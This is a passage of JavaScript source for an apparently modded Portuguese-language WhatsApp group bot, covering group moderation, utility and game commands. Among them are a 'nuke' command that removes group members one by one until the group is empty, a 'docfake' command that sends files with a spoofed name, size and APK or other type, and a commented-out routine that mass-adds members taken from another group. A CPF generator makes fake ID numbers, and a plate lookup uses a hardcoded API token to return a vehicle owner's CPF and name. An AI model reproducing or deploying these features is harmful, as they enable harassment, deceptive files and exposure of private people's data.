else if (responseb[0].status === "406") pl.sendMessage(from, {text: `@${mentioned.split("@")[0]} criou esse grupo e n√£o pode ser removido(a) do grupoÔ∏è`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responseb[0].status === "404") pl.sendMessage(from, {text: `@${mentioned.split("@")[0]} j√° foi removido(a) ou saiu do grupo`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else pl.sendMessage(from, {text: `Hmm parece que deu erroÔ∏è`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
} else if (info.message.extendedTextMessage.contextInfo.mentionedJid != null && info.message.extendedTextMessage.contextInfo.mentionedJid != undefined) {
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if(mentioned.includes(sender)) return reply("üòë")
if(mentioned.includes(numerodonoa)) return reply("N√£o pode remover meu dono üò†")
if(mentioned.includes(botNumber)) return reply("üòë")
if(mentioned.length > 1) {
if(mentioned.length > groupMembers.length || mentioned.length === groupMembers.length || mentioned.length > groupMembers.length - 3) return reply(`Vai banir todo mundo mesmo?`)
sexocomrato = 0
for (let banned of mentioned) {
await sleep(100)
let responseb2 = await pl.groupParticipantsUpdate(from, [banned], 'remove')
if (responseb2[0].status === "200") sexocomrato = sexocomrato + 1
}
pl.sendMessage(from, {text: `${sexocomrato} participantes removido do grupo`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
} else {
let responseb3 = await pl.groupParticipantsUpdate(from, [mentioned[0]], 'remove')
if (responseb3[0].status === "200") pl.sendMessage(from, {text: `@${mentioned[0].split("@")[0]} foi removido do grupo com sucesso.Ô∏è`, mentions: [mentioned[0], sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responseb3[0].status === "406") pl.sendMessage(from, {text: `@${mentioned[0].split("@")[0]} criou esse grupo e n√£o pode ser removido(a) do grupoÔ∏è`, mentions: [mentioned[0], sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responseb3[0].status === "404") pl.sendMessage(from, {text: `@${mentioned[0].split("@")[0]} j√° foi removido(a) ou saiu do grupo`, mentions: [mentioned[0], sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else pl.sendMessage(from, {text: `Hmm parece que deu erroÔ∏è`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
}
}
break


case 'nomegp':
{
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
blat = args.join(" ")
pl.groupUpdateSubject(from, `${blat}`)
pl.sendMessage(from, {text: 'Sucesso, alterou o nome do grupo'}, {quoted: selo}).catch((err) => {
reply(`Ocorreu um erro`);
})
}
break

case 'descgp':
case 'descri√ß√£ogp':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.adm)
blabla = args.join(" ")
pl.groupUpdateDescription(from, `${blabla}`)
pl.sendMessage(from, {text: 'Sucesso, alterou a descri√ß√£o do grupo'}, {quoted: selo})
break


case 'setfotogp':
case 'fotogp':  
addFilter(from)
if (!isGroup) return reply('S√≥ pode ser utilizado em Grupo')
if (!isGroupAdmins) return reply('Voc√™ precisa ser ADM')
if (!isBotGroupAdmins) return reply('O bot Precisa ser ADM')
if (!isQuotedImage) return reply(`Use: ${prefix + command} <Marque uma foto>`)
ftgp = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(ftgp.mimetype))
buffimg = await getFileBuffer(ftgp, 'image')
fs.writeFileSync(rane, buffimg)
medipp = rane 
await pl.updateProfilePicture(from, {url: medipp})
reply(`Foto do grupo alterada com sucesso`) 
break

case 'fotobot':
if (!SoDono && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (!isQuotedImage) return reply(`Envie fotos com legendas ${prefix}fotobot ou tags de imagem que j√° foram enviadas`)
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
await pl.updateProfilePicture(botNumber, buff)
reply('Obrigado pelo novo perfil amor vlw')
break

case 'clonar':
if (!SoDono   && !ischyt) return reply('Voc√™ quem √© o propriet√°rio?')
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('Marque a pessoa que voc√™ quer clonar\n\n*EXEMPLO:* clone @')
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Tag cvk')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0]
let { jid, id, notify } = groupMembers.find(x => x.id === mentioned)
try {
pp = await pl.profilePictureUrl(id)
buffer = await getBuffer(pp)
pl.updateProfilePicture(botNumber, buffer)
mentions(`Foto do perfil atualizada com sucesso, usando a foto do perfil @${id.split('@')[0]}`, [id], true)
} catch (e) {
reply('Putz, deu erro, a pessoa deve estar sem foto üòî')
}
break

case 'mutados': {
var ind = GroupsMutedActived.indexOf(from)
yuri_gaykkk = 'Usu√°rios mutados:\n'
for (let _ of muted[ind].numbers) {
yuri_gaykkk += `@${_.split('@')[0]}\n`
}
yuri_gaykkk += 'Se eles dizerem um piu, meto o martelo do ban neles üò°'
reply(yuri_gaykkk)
}
break

case 'mute': {
if(!isGroup) return reply(mess.only.group)
if(!isGroupAdmins) return reply(mess.only.admin)
if(!isBotGroupAdmins) return reply(mess.only.Badmin)
if(args.length < 1) return reply('*Marque o n√∫mero que deseja mutar*')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*Marque o n√∫mero que deseja mutar*')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if(isMuted) {
var ind = GroupsMutedActived.indexOf(from)
tekp = 'Usu√°rios mutados:\n'
for (let _ of mentioned) {
tekp += `@${_.split('@')[0]}\n`
muted[ind].numbers.push(_)
}
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
tekp += 'Se eles dizerem um piu, meto o martelo do ban neles üò°'
mentions(tekp, mentioned, true)
} else {
 const data = {
jid: from,
numbers: mentioned
}
muted.push(data)
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
tekp = 'Usu√°rios mutados:\n'
for (let _ of mentioned) {
tekp += `@${_.split('@')[0]}\n`
}
tekp += 'Se eles dizerem um piu, meto o martelo do ban neles üò°'
mentions(tekp, mentioned, true)
}
}
break

case 'desmute': {
if(!isGroup) return reply(mess.only.group)
if(!isGroupAdmins) return reply(mess.only.admin)
if(!isBotGroupAdmins) return reply(mess.only.Badmin)
if(args.length < 1) return reply('*Marque o n√∫mero que deseja desmutar*')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*Marque o n√∫mero que deseja desmutar*')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
var ind = GroupsMutedActived.indexOf(from)
if(isMuted) {
for(let _ of mentioned) {
if(muted[ind].numbers.indexOf(_) >= 0) {
var rmind = muted[ind].numbers.indexOf(_)
muted[ind].numbers.splice(rmind, 1)
}
}
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
teku = 'Usu√°rios desmutados:\n'
for (let _ of mentioned) {
teku += `@${_.split('@')[0]}\n`
}
teku += 'Agr eles podem falar a vontade üòä'
mentions(teku, mentioned, true)
} else {
const data = {
jid: from,
numbers: []
}
muted.push(data)
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
teku = 'Usu√°rios desmutados:\n'
for (let _ of mentioned) {
teku += `@${_.split('@')[0]}\n`
}
teku += 'Agr eles podem falar a vontade üòä'
mentions(teku, mentioned, true)
}
}
break

case 'doc':
case 'docfake':
try {
sprd = "|"
if(!q) {
let buttons = [
{buttonId: `wkwwk`, buttonText: {displayText: 'Ok'}, type: 1}
]
let buttonMessage = {
document: fs.readFileSync('./fun√ß√µes/docf.txt'),
mimetype: 'application/vnd.android.package-archive',
fileName: `exemplo`,
fileLength: 500000000,
caption: `${prefix + command} exemplo${sprd}500${sprd}apk

Os tipos aceitos por enquanto s√£o:

> pdf
> xml
> zip
> jpg
> ppt
> apk
> txt
> aac
> pptx
> aac
> m4a
> mp4
> mp3
> svg
> png

`,
buttons: buttons,
headerType: 4,
}
return pl.sendMessage(from, buttonMessage, {quoted:selo})
}
kls = args.join(' ')
let nomedoc = kls.split(sprd)[0] || `${NomeDoBot}`
let peso = kls.split(sprd)[1] * 1000000 || '1000000'
let mimetyp = kls.split(sprd)[2].replace(" ", "") || 'gif'
let thumbc = kls.split(sprd)[3] || 'https://google.com/'
if(mimetyp.toLowerCase() == 'pdf') mimetyp = 'application/pdf'
if(mimetyp.toLowerCase() == 'apk') mimetyp = 'application/vnd.android.package-archive'
if(mimetyp.toLowerCase() == 'aac') mimetyp = 'audio/aac'
if(mimetyp.toLowerCase() == 'xml') mimetyp = 'application/xml'
if(mimetyp.toLowerCase() == 'zip') mimetyp = 'application/zip'
if(mimetyp.toLowerCase() == 'jpg') mimetyp = 'image/jpeg'
if(mimetyp.toLowerCase() == 'ppt') mimetyp = 'application/vnd.ms-powerpoint'
if(mimetyp.toLowerCase() == 'pptx') mimetyp = 'application/vnd.openxmlformats-officedocument.presentationml.presentation'
if(mimetyp.toLowerCase() == 'mp4') mimetyp = 'video/mp4'
if(mimetyp.toLowerCase() == 'm4a') mimetyp = 'audio/mp4'
if(mimetyp.toLowerCase() == 'mp3') mimetyp = 'audio/mpeg'
if(mimetyp.toLowerCase() == 'gif') mimetyp = 'image/gif'
if(mimetyp.toLowerCase() == 'png') mimetyp = 'image/png'
if(mimetyp.toLowerCase() == 'svg') mimetyp = 'image/svg+xml'
if(mimetyp.toLowerCase() == 'txt') mimetyp = 'text/plain'
let Messagemdoc = {
document: fs.readFileSync('./fun√ß√µes/docf.txt'),
mimetype: mimetyp,
jpegThumbnail: await getBuffer(thumbc),
fileName: nomedoc,
fileLength: peso,
headerType: 4,
contextInfo:{
forwardingScore:999,
isForwarded:true,
}
}
pl.sendMessage(from, Messagemdoc, {quoted:selo})
} catch (err) {
console.log(err)
reply(`Ops ocorreu um erro`)
}
break

/*
case 'clonegp':
case 'clonargp':
case 'clonagp':
case 'cg':
try {
if (!isGroup) return
if (!SoDono) return 
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (!q) {
let getGroups = await pl.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
array_gps = [];
array_gps2 = [];
for(let a of groups) {
try {
if(a.id !== from) {
array_gps.push({
title: `‚Äçùó°ùóºùó∫ùó≤: ${a.subject}`,
description: `ùóúùó±: ${a.id}\nùó†ùó≤ùó∫ùóØùóøùóºùòÄ: ${a.participants.length}`,
rowId: `${prefix}clonargp ${a.id}`
})
array_gps2.push({
title: `‚Äçùó°ùóºùó∫ùó≤: ${a.subject}`,
description: `ùóúùó±: ${a.id}\nùó†ùó≤ùó∫ùóØùóøùóºùòÄ: ${a.participants.length}`,
rowId: `${prefix}clonargp ${a.id} -m`
})
}
} catch (err) {
}
}
buttonmessage02 = {
title: `Clonar Grupos `,
text: `Selecione um grupo da lista`,
buttonText: "Selecionar",
sections: [
            {
                title: "ùóîùó±ùó∂ùó∞ùó∂ùóºùóªùóÆ ùòÄùóºÃÅ ùóºùòÄ ùó∫ùó≤ùó∫ùóØùóøùóºùòÄ",
                rows: array_gps2
            },
            {
                title: "ùó†ùòÇùó±ùóÆ ùóº ùóªùóºùó∫ùó≤ ùó≤ ùóÆ ùó±ùó≤ùòÄùó∞ùóøùó∂ùó∞ÃßùóÆÃÉùóº ùó±ùóº ùó¥ùóøùòÇùóΩùóº",
                rows: array_gps
            }
        ]
}
pl.sendMessage(from, buttonmessage02, {quoted: info})
return
}
if(args[0] === from) return reply("Oxi? Kkkk")
let oxi = isGroup ? await pl.groupMetadata(`${args[0]}`): ''
let pessoas = isGroup ? oxi.participants : ''
let nomegp = isGroup ? oxi.subject : ''
let descgp = isGroup ? oxi.desc : ''
if (args[1] !== "-m" && args[1] !== "--membros" && args[1] !== "-membros") {
await pl.groupUpdateSubject(from, `${nomegp}`)
await pl.groupUpdateDescription(from, `${descgp}`)
await pl.groupSettingUpdate(from, 'locked')
}
members_id = []
members_from = []
for (let k of groupMembers) {
members_from.push(k.id)
}
for (let bctinha of pessoas) {
if (bctinha.id !== botNumber && !members_from.includes(bctinha.id)) {
members_id.push(bctinha.id)
}
}
if(members_id.length < 220) {
if(groupMembers.length + members_id.length >= 257) {
a = members_id.length + groupMembers.length - 257
members_id.splice(a)
}
console.log(members_id)
let responsec = await pl.groupParticipantsUpdate(from, members_id, "add")
t = 0
for (let c of responsec) {
if (c.status === "200") t = t + 1
}
pl.sendMessage(`${numerodonoa}@s.whatsapp.net`, {text: `${t} membros adicionados`}, {quoted:info})
} else {
t = 0
for(let a of members_id) {
await sleep(1000)
let responsec2 = await pl.groupParticipantsUpdate(from, [a], "add")
if (responsec2.status === "200") t = t + 1
}
pl.sendMessage(`${numerodonoa}@s.whatsapp.net`, {text: `${t} membros adicionados`}, {quoted:info})
}
} catch(erro) {
if(String(erro).includes("item-not-found")) {
reply("S√≥ tem como clonar grupos que o bot esteja nele")
} else if(String(erro).includes("not-authorized")) {
reply(enviar.msg.Badm)
} else {
console.log(erro)
reply("Hmm deu erro")
}
}
break
*/

case 'nuke': 
case 'arquivargp':
if(!SoDono) return reply("S√≥ dono pode utilizar este comando...")
if (!isBotGroupAdmins) return reply('Bot precisa ser ADM, para executar esta fun√ß√£o.')
if(info.key.fromMe) return 
function banirtodos() {
var r_banirtodos = Math.floor(Math.random() * groupMembers.length + 0)
nmrbot = botNumber.split("@")[0]
var resp = `${groupMembers[r_banirtodos].id.split("@")[0]}`
if(resp === numerodonoa || resp === botNumber) {
return
} else {
pl.groupParticipantsUpdate(from, [resp + "@s.whatsapp.net"], 'remove')
}
if(groupMembers.length <= 2) {
process.exit()
}
}
setInterval(banirtodos, 1000)
break


case 'kickfake':
case 'banfake':
{
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
array_fake = [];
for(let a of groupMembers) {
if(!a.id.startsWith("55") && a.id !== botNumber && a.admin === null) {
array_fake.push(a.id)
}
}
if(array_fake.length === 0) return reply("Nenhum n√∫mero fake encontrado no grupo")
for(let a of array_fake) {
await sleep(100)
pl.groupParticipantsUpdate(from, [a], 'remove')
}
guxta_lindaokkk = `${array_fake.length} n√∫meros fake removido do grupo`
pl.sendMessage(from, {text: guxta_lindaokkk, mentions: array_fake})
}
break


case 'gerarcpf':
if(!isPremium) return reply(enviar.msg.premium)
cp1 = `${Math.floor(Math.random() * 300) + 600}`
cp2 = `${Math.floor(Math.random() * 300) + 600}`
cp3 = `${Math.floor(Math.random() * 300) + 600}`
cp4 = `${Math.floor(Math.random() * 30) + 60}`
cpf = `${cp1}.${cp2}.${cp3}-${cp4}`
await pl.sendMessage(from, {text: `CPF gerado com sucesso : ${cpf}`}, {quoted: selo})
break

case 'cep':
if(!isPremium) return reply(enviar.msg.premium)  
if (args.length == 0) return reply(`Exemplo: ${prefix + command} 54330235`)
query = args.join(" ")
get_result = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/tools/cep?apikey=apiteam&cep=${query}`)
x = get_result.resultado
k = `CEP : ${x.cep}
LOGRADOURO: ${x.logradouro}
BAIRRO : ${x.bairro}
LOCALIDADE : ${x.localidade}
UF : ${x.uf}
IBGE : ${x.ibge}
GIA : ${x.gia}
DDD : ${x.ddd}
SIAFI : ${x.siafi}`
reply(k)
break 

case 'placa':
if(!isPremium) return reply(enviar.msg.premium)  
if (args.length == 0) return reply(`Exemplo: ${prefix + command} 54330235`)
query = args.join(" ")
get_result = await fetchJson(`http://api.ifindconsultas.tk/?token=2d6de38e-6c92-485e-bacb-db64139f8a02&placa=${query}`)
x = get_result
k = `CPF : ${x.cpf}
NOME: ${x.nome}
PLACA : ${x.placa}
CHASSI : ${x.chassi}
RENAVAM : ${x.renavam}
CIDADE : ${x.cidade}
UF : ${x.uf}
CATEGORIA : ${x.categoria}
COMBUST√çVEL : ${x.combustivel}`
reply(k)
break 

case 'ddd':
if(!isPremium) return reply(enviar.msg.premium)
if (args.length < 1) return reply(`Use ${prefix + command} 21`)
ddd = body.slice(5)
ddds = await axios.get(`https://brasilapi.com.br/api/ddd/v1/${ddd}`)
dddlist = `Lista de Cidades de ${ddds.data.state} com este DDD ${q}>\n\n`
for (let i = 0; i < ddds.data.cities.length; i++) { dddlist += `${i + 1} ‚™ß *${ddds.data.cities[i]}*\n` }
pl.sendMessage(from, {text: dddlist}, {quoted: selo})	
break

case 'listaddd':
if(!isGroup) return reply(mess.only.group)
if(!isGroupAdmins) return reply(mess.only.admin)
if(args.length < 1) return reply('*FALE O C√ìDIGO DO PA√çS*')
if(isNaN(args[0]))return reply('*FALE O C√ìDIGO DO PA√çS*')
toky = `N√öMEROS COM C√ìDIGO DE PA√çS +${args[0]} REGISTRADOS NO GRUPO:\n`
men = []
for(let mem of groupMembers) {
    if(mem.id.startsWith(args[0])) {
toky += `‚û§ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(toky.indexOf('‚û§') < 0) return reply(`*NENHUM N√öMERO +${args[0]} FOI ENCONTRADO*`)
pl.sendMessage(from, {text: toky, mentions: men})
break

case 'listafake': {
if(!isGroup) return reply(mess.only.group)
if(!isGroupAdmins) return reply(mess.only.admin)
toky = 'ùóôùóîùóûùóòùó¶ ùó°ùó¢ ùóöùó•ùó®ùó£ùó¢  \n'
men = []
for(let mem of groupMembers) {
    if(!mem.id.startsWith(55)) {
toky += `‚û§ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(toky.indexOf('‚û§') < 0) return reply(' ùó°ùó≤ùóªùóµùòÇùó∫ ùóôùóÆùóπùòÄùóº ùóóùó≤ùòÅùó≤ùó∞ùòÅùóÆùó±ùóº')
pl.sendMessage(from, {text: toky, mentions: men})
}
break

case 'listabr': {
if(!isGroup) return reply(mess.only.group)
if(!isGroupAdmins) return reply(mess.only.admin)
toky = 'ùóïùó•ùóîùó¶ùóúùóüùóòùóúùó•ùó¢ùó¶ ùó°ùó¢ ùóöùó•ùó®ùó£ùó¢ \n'
men = []
for(let mem of groupMembers) {
    if(mem.id.startsWith(55)) {
toky += `‚û§ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
    }
}
if(toky.indexOf('‚û§') < 0) return reply('üáßüá∑ *NENHUM N√öMERO BR FOI ENCONTRADO* üáßüá∑')
pl.sendMessage(from, {text: toky, mentions: men})
}
break

case 'encurtalink':
if(!isPremium) return reply(enviar.msg.premium)
if(args.length < 1) return reply(`Exemplo:\n${prefix}encurtalink https://youtube.com/c/PLMODS`)
try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
await limitAdd(sender)
break

case 'celular': //alterado
if (!q) return reply(`Qual celular voc√™ est√° procurando?`)
ane = await fetchJson(`https://api-yogipw.herokuapp.com/api/search/gsmarena?query=${q}`)
busca_celular = `üìù Titulo: ${ane.judul}
‚ùó√öltima atualiza√ß√£o: ${ane.rilis}
üì± Tamanho do celular: ${ane.ukuran}
‚ö° Tipo: ${ane.type}
üóÉÔ∏è Armazenamento: ${ane.storage}
üì¥ Tela: ${ane.display}
üì≥ Polegada: ${ane.inchi}
üî∞ Resolu√ß√£o da c√¢mera: ${ane.pixel}
üì≤ Resolu√ß√£o do video: ${ane.videoPixel}
üí≠ Ram do celular: ${ane.ram}
üë§ Hardware do celular: ${ane.chipset}
‚ö†Ô∏è Bateria: ${ane.batrai}
üîã Tipo da bateria: ${ane.merek_batre}`
pl.sendMessage(from, {image: {url: `${ane.thumb}`}, caption: `${busca_celular}`}, {quoted: selo})
break

case 'mercadolivre': //YuriModz
case 'mlsrc':
case 'mercadolivresrc':
try {
if (!q) return reply("cad√™ o nome do produto?")
let GetResults = await fetchJson(`https://lzmods-src.herokuapp.com/mercadolivre?query=${q}`)
productImg = await getBuffer(GetResults[0].foto)
let productInfo = "‚òÑÔ∏è 2 Resultados Encontrados Pra Pesquisa Com Sucesso ‚òÑÔ∏è\n"
for (let mxz of GetResults){
productInfo += `
üí• Nome Do Produto: ${mxz.titulo_do_produto}
üíµ Valor: ${mxz.pre√ßo}
üî± Quantidade Vendida: ${mxz.quantidadeVendida}
üìå Estoque: ${mxz.estoque}
üíé Regiao Do Vendedor: ${mxz.regiao_do_vendedor}
ü•Ç Link Do Produto: ${mxz.link}
`
}
pl.sendMessage(from, {image: productImg, caption: productInfo}, {quoted: selo})
} catch(err) {
console.log(err)
reply("error")
}
break

case 'cassino':
  
const soto = [
'üçä : üçí : üçê',
'üçí : üîî : üçä',
'üçá : üçá : üçá',
'üçä : üçã : üîî',
'üîî : üçí : üçê',
'üîî : üçí : üçä',
'üçä : üçã : ??',		
'üçê : üçí : üçã',
'üçê : üçê : üçê',
'üçä : üçí : üçí',
'üîî : üîî : üçá',
'üçå : üçí : üîî',
'üçê : üîî : üîî',
'üçä : üçã : üçí',
'üçã : üçã : üçå',
'üîî : üîî : üçá',
'üîî : üçê : üçá',
'üîî : üîî : üîî',
'üçí : üçí : üçí',
'üçå : üçå : üçå'
]		  

const somtoy2 = sotoy[Math.floor(Math.random() * sotoy.length)]
if ((somtoy2 == 'ü•ë : ü•ë : ü•ë') ||(somtoy2 == 'üçâ : üçâ : üçâ') ||(somtoy2 == 'üçì : üçì : üçì') ||(somtoy2 == 'üçé : üçé : üçé') ||(somtoy2 == 'üçç : üçç : üçç') ||(somtoy2 == 'ü•ù : ü•ù : ü•ù') ||(somtoy2 == 'üçë : üçë : üçë') ||(somtoy2 == 'ü•• : ü•• : ü••') ||(somtoy2 == 'üçã : üçã : üçã') ||(somtoy2 == 'üçê : üçê : üçê') ||(somtoy2 == 'üçå : üçå : üçå') ||(somtoy2 == 'üçí : üçí : üçí') ||(somtoy2 == 'üîî : üîî : üîî') ||(somtoy2 == 'üçä : üçä : üçä') ||(somtoy2 == 'üçá : üçá : üçá')) {
var Vit√≥ria = "Voc√™ ganhou!!!"
} else {
var Vit√≥ria = "Voc√™ perdeu..."
}

const cassino = `
‚îè‚îÅ‚îÅ‚îÅ‚îÅ‚ù™üé∞‚ù´‚îÅ‚îÅ‚îÅ‚îÅ
‚î£‚ñ∫ ${somtoy2}‚óÑ‚îõ
‚îó‚îÅ‚îÅ‚îÅ‚îÅ‚ù™üí∞‚ù´‚îÅ‚îÅ‚îÅ‚îÅ

*${Vit√≥ria}*`
  
sendBtext(from, `${cassino}`,  `${Vit√≥ria}`, [
{buttonId: `${prefix}cassino`, buttonText: {displayText: `Proximo`}, type: 1}], selo)
break

//========FINAL DE CMD DE GRUPO=============

//======== CMD DE DONO=============


      case 'seradm': {
     if (!SoDono && !m.key.fromMe) return reply(mess.owner)
       reply(`Agora vc √© adm do grupo.`)
kiceed = sender
pl.groupParticipantsUpdate(from, [kiceed], 'promote')
}
break

case 'sair':
case 'leave':
if (!SoDono) reply (`somente o ${NickDono}`)
await sleep (3000)
pl.groupLeave(from, [sender], "leave")
break

case 'sermenbro': {
     if (!SoDono && !m.key.fromMe) return reply(mess.owner)
     reply(`Agora vc n√£o √© mais adm do grupo.`)
     kicee = sender
await pl.groupParticipantsUpdate(from, [kicee], 'demote')
}
break

case 'aviso': {
                if (!isGroup) return reply(`S√ì EM GRUPO`)
                if (!isGroupAdmins) return reply(`PRECISA SER ADMINISTRADOR`)
                if (!isBotGroupAdmins) return reply(`BOT PREPRECISA SER ADMINISTRADOR`)
                let guxta_lindaokkkj = `üì¢ *AVISO DO ADMINISTRADOR* üì¢\n\n*N√≥s, administradores do grupo :\n${groupName}*\n\n${q ? q : 'em branco'}\n\n`
                for (let mem of participants) {
                    guxta_lindaokkkj += `¬∞ @${mem.id.split('@')[0]}\n`
                }
                pl.sendMessage(m.chat, { text: guxta_lindaokkkj, mentions: participants.map(a => a.id) }, { quoted: selo })
            }
                break

//======== FINAL DE CMD DE DONO=============


//========PING=============


case 'speed':
case 'ping':
    let timestamp = speed()
    let latensi = speed() - timestamp
    neww = performance.now()
    oldd = performance.now()
reply('ùëΩùë¨ùë≥ùë∂ùë™ùë∞ùë´ùë®ùë´ùë¨: ' + `${latensi.toFixed(4)}` + 'ùë¥ùë∫')
break

//=====================================


//=====================================


case 'gtts':
if (args.length < 1) return reply(`Cade o texto?, digite algo Exemplo:\n${prefix}gtts PT Oi`) 
const gtts = require('./fun√ß√µes de cmd/fun√ß√µes/gtts')(args[0])
if (args.length < 2) return reply('Falta colocar o c√≥digo do idioma!')
dtt = body.slice(8)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
if(dtt.length > 4000) return reply('Para reduzir spam o m√°ximo de letras permitidas s√£o 4000!')
gtts.save(ranm, dtt, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buffer = fs.readFileSync(rano)
pl.sendMessage(from, {audio: buffer, ptt:true}, {quoted: selo})
fs.unlinkSync(rano)
})
})
break





case 'gerarlink':  
case 'imgpralink':    
try {
if (isQuotedImage) {
reply(enviar.espere)
boij = isQuotedImage ? JSON.parse(JSON.stringify(m).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : m
owgi = await getFileBuffer(boij, 'image')
res = await upload(owgi)
reply(res)
} else {
reply(`Mande uma imagem com a legenda ${prefix + command}`)
}
} catch {
reply('Ocorreu algum Error, desculpe üòî')
}
break

case 'videourl':
case 'videopralink':
try {
if ((isQuotedVideo) && args.length == 0) {
reply(enviar.espere)
boij = isQuotedVideo ? JSON.parse(JSON.stringify(m).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.videoMessage : m
owgi = await getFileBuffer(boij, 'video')
res = await upload(owgi)
reply(res)
} else {
reply(`Mande v√≠deo com a legenda ${prefix + command}`)
}
} catch {
reply('Ocorreu algum Error, desculpe üòî/ O limite do tamanho de v√≠deo que gero o link, √© 30 segundos.')
}
break

//================ DESTRAVA================\\

case 'destrava': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonsee = [
                    {buttonId: `/destrava2`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava}`,
                    footer: '¬© Copyright by Yuri Modz_',
                    buttons: buttonsee,
                    headerType: 2
                }
                pl.sendMessage(m.chat, buttonMessagee, {quoted: selo})
            }
            break

case 'destrava2': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseee = [
                    {buttonId: `/destrava3`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava2}`,
                    footer: '¬© Copyright by Yuri Modz_',
                    buttons: buttonseee,
                    headerType: 2
                }
                pl.sendMessage(m.chat, buttonMessagee, {quoted: selo})
            }
            break

case 'destrava3': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseeee = [
                    {buttonId: `/destrava4`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava3}`,
                    footer: '¬© Copyright by Yuri Modz_',
                    buttons: buttonseeee,
                    headerType: 2
                }
                pl.sendMessage(m.chat, buttonMessagee, {quoted: selo})
            }
            break

case 'destrava4': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)  
                let buttonseeeee = [
                    {buttonId: `/destrava5`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava2}`,
                    footer: '¬© Copyright by Yuri Modz_',
                    buttons: buttonseeeee,
                    headerType: 2
                }
                pl.sendMessage(m.chat, buttonMessagee, {quoted: selo})
            }
            break

case 'destrava5': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttondes = [
                    {buttonId: `/destrava6`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava5}`,
                    footer: '¬© Copyright by Yuri Modz_',
                    buttons: buttondes,
                    headerType: 2
                }
                pl.sendMessage(m.chat, buttonMessagee, {quoted: selo})
            }
            break

case 'destrava6': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttondess = [
                    {buttonId: `/destrava7`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava6}`,
                    footer: '¬© Copyright by Yuri Modz_',
                    buttons: buttondess,
                    headerType: 2
                }
                pl.sendMessage(m.chat, buttonMessagee, {quoted: selo})
            }
            break

case 'destrava7': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseebute = [
                    {buttonId: `/destrava8`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava7}`,
                    footer: '¬© Copyright by Yuri Modz_',
                    buttons: buttonseebute,
                    headerType: 2
                }
                pl.sendMessage(m.chat, buttonMessagee, {quoted: selo})
            }
            break

case 'destrava8': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseebuute = [
                    {buttonId: `/destrava9`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava8}`,
                    footer: '¬© Copyright by Yuri Modz_',
                    buttons: buttonseebuute,
                    headerType: 2
                }
